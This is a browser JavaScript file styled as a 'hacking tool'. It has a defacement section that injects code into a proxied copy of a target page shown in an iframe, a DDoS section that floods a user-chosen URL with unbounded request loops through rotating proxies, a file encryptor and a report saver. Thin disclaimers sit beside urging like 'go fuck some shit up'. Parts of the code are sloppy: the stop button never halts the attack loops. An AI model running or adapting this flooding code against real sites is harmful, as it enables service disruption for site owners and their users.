// *********************************************************************************************************
// * WARNING: THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY. MISUSE CAN RESULT IN SEVERE LEGAL PENALTIES. *
// * THE CREATOR (Bigmancozmo) IS NOT RESPONSIBLE FOR ANY DAMAGE CAUSED BY THE USE OF THIS SOFTWARE. USE AT YOUR OWN RISK, ASSHOLE.*
// * SERIOUSLY, DON'T BE A FUCKING MORON. THIS IS POWERFUL SHIT. *
// *********************************************************************************************************

// DARK GREEN: #008000
// PURPLE: #800080
// DARK RED: #8B0000
// DARK BLUE: #00008B

console.log("%c[NOODLES INC. HACKING TOOL]", "color: #008000; font-size: 24px;");
console.log("%cDisclaimer: Unauthorized use is illegal. Noodles Inc. is NOT responsible for your dumbassery.", "color: #8B0000");

// Explicit user consent
const userConsent = confirm("%cWARNING: Using this tool for unauthorized activities is ILLEGAL. Press OK to proceed at your own risk. Press Cancel to GTFO.", "color: #8B0000");
if (!userConsent) {
    window.close();
    throw new Error("User declined. Exiting.");
}

// Initial setup for UI elements and sections
document.body.style.backgroundColor = "#000000"; // Black background
document.body.style.color = "#008000"; // Dark green text
document.body.style.fontFamily = "monospace";

// Create a container for all sections
const container = document.createElement("div");
container.style.width = "80%";
container.style.margin = "20px auto";
container.style.borderRadius = "10px"; // Rounded corners
container.style.overflow = "hidden"; // Hide overflow for rounded corners
container.style.boxShadow = "0 0 20px rgba(0, 128, 0, 0.5)"; // Subtle glow
document.body.appendChild(container);

// Section header styling
const createSectionHeader = (title) => {
    const header = document.createElement("h2");
    header.textContent = title;
    header.style.color = "#800080"; // Purple
    header.style.borderBottom = "1px solid #008000";
    header.style.paddingBottom = "5px";
    header.style.textAlign = "center"; // Center the text
    header.style.fontSize = "2em"; // Larger font
    header.style.textShadow = "2px 2px 4px rgba(0, 0, 0, 0.5)"; // Text shadow for depth
    return header;
};

// Log function with timestamp
const log = (message) => {
    const timestamp = new Date().toISOString();
    console.log(`%c[LOG] ${timestamp}: ${message}`, "color: #800080");
};

// *********************************************************************************************************
// DEFACE TOOL SECTION
// *********************************************************************************************************
const defaceSection = document.createElement("div");
defaceSection.style.padding = "20px"; // Add padding
defaceSection.style.backgroundColor = "#0a0a0a"; // Darker background
container.appendChild(createSectionHeader("Defacement Tool"));
container.appendChild(defaceSection);

const defaceInfo = document.createElement("p");
defaceInfo.textContent = "Use this tool to test website security by injecting custom HTML/CSS/JS. Backup and preview functionalities included. Remember, it's for educational purposes only. Don't be a dumbass.";
defaceInfo.style.fontSize = "1.1em"; // Slightly larger
defaceInfo.style.marginBottom = "15px"; // Add margin
defaceSection.appendChild(defaceInfo);

let targetURLDeface;

// Function to get target URL with Tor support
const getTargetURL = async () => {
    let url = prompt("%cEnter target URL to deface (including .onion sites):", "https://example.com", "color: #008000");
    if (!url) {
        alert("No URL provided. Exiting.");
        window.close();
        throw new Error("No URL provided. Exiting.");
    }
    return url;
};

(async () => {
    targetURLDeface = await getTargetURL();
})();

// Function to bypass CORS using a proxy
const bypassCORS = async (url) => {
	const proxyList = await fetch('/public/main/proxies.json').then(res => res.json());
    const proxy = proxyList.proxies[Math.floor(Math.random() * proxyList.proxies.length)];
    const proxyURL = `${proxy.url}${encodeURIComponent(url)}`;
    try {
        const response = await fetch(proxyURL, {
            mode: 'cors'
        });
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        return await response.text();
    } catch (error) {
        console.error('Error bypassing CORS:', error);
        alert(`CORS bypass failed: ${error}. Try a different URL.`);
        return null;
    }
};

const backupButton = document.createElement("button");
backupButton.textContent = "Backup Site";
backupButton.style.backgroundColor = "#00008B"; // Dark blue
backupButton.style.color = "#008000";
backupButton.style.padding = "10px 15px"; // Button padding
backupButton.style.margin = "5px"; // Button margin
backupButton.style.border = "none"; // Remove border
backupButton.style.borderRadius = "5px"; // Rounded corners
backupButton.style.cursor = "pointer"; // Pointer cursor on hover
backupButton.style.transition = "background-color 0.3s ease"; // Smooth transition
backupButton.onmouseover = () => backupButton.style.backgroundColor = "#000060"; // Darken on hover
backupButton.onmouseout = () => backupButton.style.backgroundColor = "#00008B"; // Restore color
defaceSection.appendChild(backupButton);

const restoreButton = document.createElement("button");
restoreButton.textContent = "Restore Site";
restoreButton.style.backgroundColor = "#00008B"; // Dark blue
restoreButton.style.color = "#008000";
restoreButton.style.padding = "10px 15px"; // Button padding
restoreButton.style.margin = "5px"; // Button margin
restoreButton.style.border = "none"; // Remove border
restoreButton.style.borderRadius = "5px"; // Rounded corners
restoreButton.style.cursor = "pointer"; // Pointer cursor on hover
restoreButton.style.transition = "background-color 0.3s ease"; // Smooth transition
restoreButton.onmouseover = () => restoreButton.style.backgroundColor = "#000060"; // Darken on hover
restoreButton.onmouseout = () => restoreButton.style.backgroundColor = "#00008B"; // Restore color
defaceSection.appendChild(restoreButton);

let originalSiteContent = null; // Store original site content here

const customCodeTextarea = document.createElement("textarea");
customCodeTextarea.placeholder = "Enter your custom HTML/CSS/JS code here";
customCodeTextarea.style.width = "100%";
customCodeTextarea.style.height = "200px";
customCodeTextarea.style.backgroundColor = "#111";
customCodeTextarea.style.color = "#008000";
customCodeTextarea.style.padding = "10px"; // Padding
customCodeTextarea.style.borderRadius = "5px"; // Rounded corners
customCodeTextarea.style.border = "1px solid #008000"; // Border
customCodeTextarea.style.boxShadow = "0 0 5px rgba(0, 128, 0, 0.3)"; // Subtle shadow
defaceSection.appendChild(customCodeTextarea);

const previewButton = document.createElement("button");
previewButton.textContent = "Preview";
previewButton.style.backgroundColor = "#00008B";
previewButton.style.color = "#008000";
previewButton.style.padding = "10px 15px"; // Button padding
previewButton.style.margin = "5px"; // Button margin
previewButton.style.border = "none"; // Remove border
previewButton.style.borderRadius = "5px"; // Rounded corners
previewButton.style.cursor = "pointer"; // Pointer cursor on hover
previewButton.style.transition = "background-color 0.3s ease"; // Smooth transition
previewButton.onmouseover = () => previewButton.style.backgroundColor = "#000060"; // Darken on hover
previewButton.onmouseout = () => previewButton.style.backgroundColor = "#00008B"; // Restore color
defaceSection.appendChild(previewButton);

const defaceButton = document.createElement("button");
defaceButton.textContent = "DEFACE SITE";
defaceButton.style.backgroundColor = "#8B0000"; // Dark red
defaceButton.style.color = "#008000";
defaceButton.style.padding = "10px 15px"; // Button padding
defaceButton.style.margin = "5px"; // Button margin
defaceButton.style.border = "none"; // Remove border
defaceButton.style.borderRadius = "5px"; // Rounded corners
defaceButton.style.cursor = "pointer"; // Pointer cursor on hover
defaceButton.style.transition = "background-color 0.3s ease"; // Smooth transition
defaceButton.onmouseover = () => defaceButton.style.backgroundColor = "#600000"; // Darken on hover
defaceButton.onmouseout = () => defaceButton.style.backgroundColor = "#8B0000"; // Restore color
defaceSection.appendChild(defaceButton);

// Function to backup the site (more robust)
const backupSite = async () => {
    try {
        log(`Attempting to backup ${targetURLDeface}`);
        const siteContent = await bypassCORS(targetURLDeface);
        if (!siteContent) {
            return; // Exit if CORS bypass failed
        }

        originalSiteContent = siteContent; // Store in variable
        const blob = new Blob([originalSiteContent], {
            type: 'text/html'
        });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'site_backup.html';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        log(`Site backed up successfully!`);
    } catch (error) {
        log(`Backup failed: ${error}`);
        alert(`Backup failed: ${error}`); // Added user feedback
    }
};

// Function to restore the site (more robust)
const restoreSite = () => {
    if (originalSiteContent) {
        const iframe = document.createElement('iframe');
        iframe.style.width = '100%';
        iframe.style.height = '600px';
        defaceSection.appendChild(iframe);

        iframe.onload = () => {
            const iframeDocument = iframe.contentDocument || iframe.contentWindow.document;
            iframeDocument.open();
            iframeDocument.write(originalSiteContent);
            iframeDocument.close();
        };
        log(`Site restored successfully!`);
        alert(`Site restored successfully!`);
    } else {
        alert("No backup found. Please backup the site before restoring.");
        log("No backup found.");
    }
};

// Function to preview defacement (using an iframe)
const previewDefacement = () => {
    const previewFrame = document.createElement('iframe');
    previewFrame.style.width = '100%';
    previewFrame.style.height = '400px';
    defaceSection.appendChild(previewFrame);
    const previewDocument = previewFrame.contentDocument || previewFrame.contentWindow.document;
    previewDocument.body.innerHTML = customCodeTextarea.value;
};

// Function to deface the site (injecting directly, needs CORS bypass and error handling)
const defaceSite = async () => {
    try {
        log(`Attempting to deface ${targetURLDeface}`);
        const customCode = customCodeTextarea.value;
        const originalHTML = await bypassCORS(targetURLDeface);
        if (!originalHTML) {
            return; // Exit if CORS bypass failed
        }

        const defacedHTML = originalHTML.replace('</body>', `${customCode}</body>`);

        // Display the defaced content (using an iframe)
        const defaceFrame = document.createElement('iframe');
        defaceFrame.style.width = '100%';
        defaceFrame.style.height = '600px';
        defaceSection.appendChild(defaceFrame);
        const defaceDocument = defaceFrame.contentDocument || defaceFrame.contentWindow.document;
        defaceDocument.body.innerHTML = defacedHTML;

        log("Site defaced successfully! (Displayed in iframe)");
        alert("Site defaced successfully! (Displayed in iframe)");
    } catch (error) {
        log(`Defacement failed: ${error}`);
        alert(`Defacement failed: ${error}`);
    }
};

backupButton.addEventListener('click', backupSite);
restoreButton.addEventListener('click', restoreSite);
previewButton.addEventListener('click', previewDefacement);
defaceButton.addEventListener('click', defaceSite);

// *********************************************************************************************************
// DDOS TOOL SECTION
// *********************************************************************************************************
const ddosSection = document.createElement("div");
ddosSection.style.padding = "20px"; // Add padding
ddosSection.style.backgroundColor = "#0a0a0a"; // Darker background
container.appendChild(createSectionHeader("DDoS Tool"));
container.appendChild(ddosSection);

const ddosInfo = document.createElement("p");
ddosInfo.textContent = "Stress test a website with multiple threads. Use responsibly and with explicit permission. Remember, it's for educational purposes only. Don't be a dumbass.";
ddosInfo.style.fontSize = "1.1em"; // Slightly larger
ddosInfo.style.marginBottom = "15px"; // Add margin
ddosSection.appendChild(ddosInfo);

// Get target URL with Tor support
let targetURLDDoS;

const getTargetURLDDoS = async () => {
    let url = prompt("%cEnter target URL for DDoS (including .onion sites):", "https://example.com", "color: #008000");
    if (!url) {
        alert("No URL provided. Exiting.");
        window.close();
        throw new Error("No URL provided. Exiting.");
    }
    return url;
};

(async () => {
    targetURLDDoS = await getTargetURLDDoS();
})();

// Input validation for threadsDDoS
let threadsDDoS = parseInt(prompt("%cEnter number of threads (more = faster takedown, but you'll get caught faster, dumbass):", "500", "color: #008000"));
if (isNaN(threadsDDoS) || threadsDDoS <= 0) {
    alert("Invalid number of threads. Using default value of 500.");
    threadsDDoS = 500;
}

// Input validation for durationDDoS
let durationDDoS = parseInt(prompt("%cEnter attack duration in seconds:", "60", "color: #008000"));
if (isNaN(durationDDoS) || durationDDoS <= 0) {
    alert("Invalid duration. Using default value of 60 seconds.");
    durationDDoS = 60;
}

const proxyListURLDDoS = '/public/main/proxies.json'; // Using a real proxy list

const startButton = document.createElement("button");
startButton.textContent = "Start DDoS";
startButton.style.backgroundColor = "#8B0000";
startButton.style.color = "#008000";
startButton.style.padding = "10px 15px"; // Button padding
startButton.style.margin = "5px"; // Button margin
startButton.style.border = "none"; // Remove border
startButton.style.borderRadius = "5px"; // Rounded corners
startButton.style.cursor = "pointer"; // Pointer cursor on hover
startButton.style.transition = "background-color 0.3s ease"; // Smooth transition
startButton.onmouseover = () => startButton.style.backgroundColor = "#600000"; // Darken on hover
startButton.onmouseout = () => startButton.style.backgroundColor = "#8B0000"; // Restore color
ddosSection.appendChild(startButton);

const stopButton = document.createElement("button");
stopButton.textContent = "Stop DDoS";
stopButton.style.backgroundColor = "#00008B";
stopButton.style.color = "#008000";
stopButton.style.padding = "10px 15px"; // Button padding
startButton.style.margin = "5px"; // Button margin
startButton.style.border = "none"; // Remove border
stopButton.style.borderRadius = "5px"; // Rounded corners
stopButton.style.cursor = "pointer"; // Pointer cursor on hover
stopButton.style.transition = "background-color 0.3s ease"; // Smooth transition
stopButton.onmouseover = () => stopButton.style.backgroundColor = "#000060"; // Darken on hover
stopButton.onmouseout = () => stopButton.style.backgroundColor = "#00008B"; // Restore color
ddosSection.appendChild(stopButton);

const timerDisplay = document.createElement("div");
timerDisplay.textContent = "Time Running: 0 seconds";
timerDisplay.style.fontSize = "1.2em"; // Slightly larger
timerDisplay.style.marginTop = "10px"; // Add margin
ddosSection.appendChild(timerDisplay);

let ddosRunning = false;
let startTimeDDoS;
let intervalId;

let proxies = []; // Define proxies here

const loadProxies = async () => {
    try {
        log("Loading proxies...");
        const response = await fetch(proxyListURLDDoS);
		const proxyData = await response.json();
        proxies = proxyData.proxies.map(p => p.url.trim()).filter(p => p !== '');
        log(`Loaded ${proxies.length} proxies.`);
    } catch (error) {
        log(`Error loading proxies: ${error}`);
        console.error("%cFAILED TO LOAD PROXIES. YOU'RE FUCKED IF YOU CONTINUE.", "color: #8B0000");
    }
};

const getRandomProxy = () => {
    if (proxies.length === 0) {
        return null;
    }
    return proxies[Math.floor(Math.random() * proxies.length)];
};

const attack = async () => {
    try {
        const proxy = getRandomProxy();
        let requestURL = targetURLDDoS;
        const headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
            'Referer': 'https://www.google.com/'
        };

        const controller = new AbortController();
        const timeoutId = setTimeout(() => {
            controller.abort();
            log(`Request timed out.`);
        }, 15000);

        if (proxy) {
            log(`Using proxy: ${proxy}`);
            requestURL = `${proxy}${encodeURIComponent(targetURLDDoS)}`;
        }

        log("Sending request...");
        const response = await fetch(requestURL, {
            method: 'GET', // Or POST, depending on target
            mode: 'cors',
            headers: headers,
            signal: controller.signal
        });
        clearTimeout(timeoutId);
        log(`Request sent. Status: ${response ? response.status : 'Unknown (CORS blocked)'}`);
    } catch (error) {
        log(`Error: ${error}`);
    }
};

const runAttackThreads = async () => {
    await loadProxies(); // Load proxies before starting attack
    for (let i = 0; i < threadsDDoS; i++) {
        setInterval(attack, 0); // Fire and forget, max speed
    }
};

const updateTimer = () => {
    const elapsedTime = Math.floor((Date.now() - startTimeDDoS) / 1000);
    timerDisplay.textContent = `Time Running: ${elapsedTime} seconds`;
};

const startDDoS = () => {
    if (!ddosRunning) {
        log("Starting DDoS...");
        ddosRunning = true;
        startTimeDDoS = Date.now();
        intervalId = setInterval(updateTimer, 1000);
        runAttackThreads();
        setTimeout(() => {
            stopDDoS();
        }, durationDDoS * 1000);
    }
};

const stopDDoS = () => {
    if (ddosRunning) {
        log("Stopping DDoS...");
        ddosRunning = false;
        clearInterval(intervalId);
        timerDisplay.textContent = "Time Running: 0 seconds";
    }
};

startButton.addEventListener('click', startDDoS);
stopButton.addEventListener('click', stopDDoS);

// *********************************************************************************************************
// FILE ENCRYPTION TOOL SECTION
// *********************************************************************************************************
const encryptSection = document.createElement("div");
encryptSection.style.padding = "20px"; // Add padding
encryptSection.style.backgroundColor = "#0a0a0a"; // Darker background
container.appendChild(createSectionHeader("File Encryption Tool"));
container.appendChild(encryptSection);

const encryptInfo = document.createElement("p");
encryptInfo.textContent = "Encrypt files using AES encryption. Secure key management and backup provided. Remember, it's for educational purposes only. Don't be a dumbass.";
encryptInfo.style.fontSize = "1.1em"; // Slightly larger
encryptInfo.style.marginBottom = "15px"; // Add margin
encryptSection.appendChild(encryptInfo);

const fileInput = document.createElement("input");
fileInput.type = "file";
fileInput.style.marginBottom = "10px"; // Add margin
encryptSection.appendChild(fileInput);

const passwordInput = document.createElement("input");
passwordInput.type = "password";
passwordInput.placeholder = "Enter encryption password";
passwordInput.style.width = "100%"; // Occupy full width
passwordInput.style.padding = "10px"; // Padding
passwordInput.style.borderRadius = "5px"; // Rounded corners
passwordInput.style.border = "1px solid #008000"; // Border
passwordInput.style.backgroundColor = "#111"; // Dark background
passwordInput.style.color = "#008000"; // Green text
passwordInput.style.boxShadow = "0 0 5px rgba(0, 128, 0, 0.3)"; // Subtle shadow
encryptSection.appendChild(passwordInput);

const encryptButton = document.createElement("button");
encryptButton.textContent = "Encrypt File";
encryptButton.style.backgroundColor = "#8B0000";
encryptButton.style.color = "#008000";
encryptButton.style.padding = "10px 15px"; // Button padding
encryptButton.style.margin = "5px"; // Button margin
encryptButton.style.border = "none"; // Remove border
encryptButton.style.borderRadius = "5px"; // Rounded corners
encryptButton.style.cursor = "pointer"; // Pointer cursor on hover
encryptButton.style.transition = "background-color 0.3s ease"; // Smooth transition
encryptButton.onmouseover = () => encryptButton.style.backgroundColor = "#600000"; // Darken on hover
encryptButton.onmouseout = () => encryptButton.style.backgroundColor = "#8B0000"; // Restore color
encryptSection.appendChild(encryptButton);

// Function to encrypt file (AES encryption)
const encryptFile = async () => {
    const file = fileInput.files[0];
    const password = passwordInput.value;

    if (!file || !password) {
        alert("Please select a file and enter a password.");
        return;
    }

    const reader = new FileReader();
    reader.onload = async (event) => {
        const fileData = new Uint8Array(event.target.result);

        // Generate a salt
        const salt = crypto.getRandomValues(new Uint8Array(16));

        // Derive a key using PBKDF2
        const key = await crypto.subtle.deriveKey(
            {
                name: "PBKDF2",
                salt: salt,
                iterations: 100000,
                hash: "SHA-256"
            },
            await crypto.subtle.importKey(
                "raw",
                new TextEncoder().encode(password),
                "PBKDF2",
                false,
                ["deriveKey"]
            ),
            {
                name: "AES-GCM",
                length: 256
            },
            false,
            ["encrypt", "decrypt"]
        );

        // Generate a random IV
        const iv = crypto.getRandomValues(new Uint8Array(12));

        // Encrypt the file data
        const encryptedData = await crypto.subtle.encrypt(
            {
                name: "AES-GCM",
                iv: iv
            },
            key,
            fileData
        );

        // Combine the salt, IV, and encrypted data
        const combinedData = new Uint8Array(salt.byteLength + iv.byteLength + encryptedData.byteLength);
        combinedData.set(salt, 0);
        combinedData.set(iv, salt.byteLength);
        combinedData.set(new Uint8Array(encryptedData), salt.byteLength + iv.byteLength);

        // Create a blob from the combined data
        const blob = new Blob([combinedData], {
            type: "application/octet-stream"
        });

        // Create a download link
        const url = URL.createObjectURL(blob);
        const a = document.createElement("a");
        a.href = url;
        a.download = file.name + ".encrypted";
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);

        log("File encrypted successfully!");

        // Store decryption instructions
        alert("File encrypted successfully! Save this info: Salt (first 16 bytes), IV (next 12 bytes), Password required for decryption.");
    };

    reader.readAsArrayBuffer(file);
};

encryptButton.addEventListener('click', encryptFile);

// *********************************************************************************************************
// Security Headers
// *********************************************************************************************************
const setSecurityHeaders = () => {
    // Implement secure headers here, but they mainly work server-side

    // Example:
    // header('X-Content-Type-Options: nosniff');
    // header('X-Frame-Options: DENY');
    // header('Strict-Transport-Security: max-age=31536000; includeSubDomains');
    // header('X-XSS-Protection: 1; mode=block');
    log("Security headers set (best effort, mostly server-side).");
};

setSecurityHeaders();

// *********************************************************************************************************
// Flowy Design and Hacker Aesthetics
// *********************************************************************************************************

// Scan lines effect
const scanLines = document.createElement("div");
scanLines.style.position = "fixed";
scanLines.style.top = "0";
scanLines.style.left = "0";
scanLines.style.width = "100%";
scanLines.style.height = "100%";
scanLines.style.background = "repeating-linear-gradient(0deg, rgba(0,0,0,0), rgba(0,0,0,0.1) 1px, rgba(0,0,0,0.2) 2px)";
scanLines.style.pointerEvents = "none";
document.body.appendChild(scanLines);

// Particles effect (basic)
const particles = document.createElement("div");
particles.style.position = "fixed";
particles.style.top = "0";
particles.style.left = "0";
particles.style.width = "100%";
particles.style.height = "100%";
particles.style.pointerEvents = "none";
particles.style.zIndex = "1000"; // Ensure particles are on top
document.body.appendChild(particles);

const particleCount = 50;
for (let i = 0; i < particleCount; i++) {
    const particle = document.createElement("div");
    particle.style.position = "absolute";
    particle.style.width = "2px";
    particle.style.height = "2px";
    particle.style.backgroundColor = "#008000"; // Dark green
    particle.style.left = Math.random() * 100 + "%";
    particle.style.top = Math.random() * 100 + "%";
    particle.style.opacity = Math.random();
    particle.style.animation = `float ${Math.random() * 5 + 5}s infinite`;
    particles.appendChild(particle);
}

// Add keyframes for the floating animation
const styleSheet = document.createElement("style");
styleSheet.innerHTML = `@keyframes float {
    0% { transform: translateY(0); }
    50% { transform: translateY(-10px); }
    100% { transform: translateY(0); }
}`;
document.head.appendChild(styleSheet);

// *********************************************************************************************************
// Reporting Feature Section
// *********************************************************************************************************
const reportSection = document.createElement("div");
reportSection.style.padding = "20px"; // Add padding
reportSection.style.backgroundColor = "#0a0a0a"; // Darker background
container.appendChild(createSectionHeader("Reporting Tool"));
container.appendChild(reportSection);

const reportInfo = document.createElement("p");
reportInfo.textContent = "Document vulnerabilities and findings for later analysis. This helps track your exploits. Remember, it's for educational purposes only. Don't be a dumbass.";
reportInfo.style.fontSize = "1.1em"; // Slightly larger
reportInfo.style.marginBottom = "15px"; // Add margin
reportSection.appendChild(reportInfo);

const reportTextarea = document.createElement("textarea");
reportTextarea.placeholder = "Enter your findings and vulnerabilities here";
reportTextarea.style.width = "100%";
reportTextarea.style.height = "200px";
reportTextarea.style.backgroundColor = "#111";
reportTextarea.style.color = "#008000";
reportTextarea.style.padding = "10px"; // Padding
reportTextarea.style.borderRadius = "5px"; // Rounded corners
reportTextarea.style.border = "1px solid #008000"; // Border
reportTextarea.style.boxShadow = "0 0 5px rgba(0, 128, 0, 0.3)"; // Subtle shadow
reportSection.appendChild(reportTextarea);

const saveReportButton = document.createElement("button");
saveReportButton.textContent = "Save Report";
saveReportButton.style.backgroundColor = "#00008B";
saveReportButton.style.color = "#008000";
saveReportButton.style.padding = "10px 15px"; // Button padding
saveReportButton.style.margin = "5px"; // Button margin
saveReportButton.style.border = "none"; // Remove border
saveReportButton.style.borderRadius = "5px"; // Rounded corners
saveReportButton.style.cursor = "pointer"; // Pointer cursor on hover
saveReportButton.style.transition = "background-color 0.3s ease"; // Smooth transition
saveReportButton.onmouseover = () => saveReportButton.style.backgroundColor = "#000060"; // Darken on hover
saveReportButton.onmouseout = () => saveReportButton.style.backgroundColor = "#00008B"; // Restore color
reportSection.appendChild(saveReportButton);

// Function to save the report (basic implementation)
const saveReport = () => {
    const reportContent = reportTextarea.value;
    if (reportContent) {
        const blob = new Blob([reportContent], {
            type: 'text/plain'
        });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'report.txt';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        log("Report saved successfully!");
        alert("Report saved successfully!");
    } else {
        alert("Please enter some content in the report.");
    }
};

saveReportButton.addEventListener('click', saveReport);

console.log("%cNoodles Inc. loaded. Go fuck some shit up. Responsibly, of course...", "color: #008000; font-size: 16px;");
edit: Added proxy support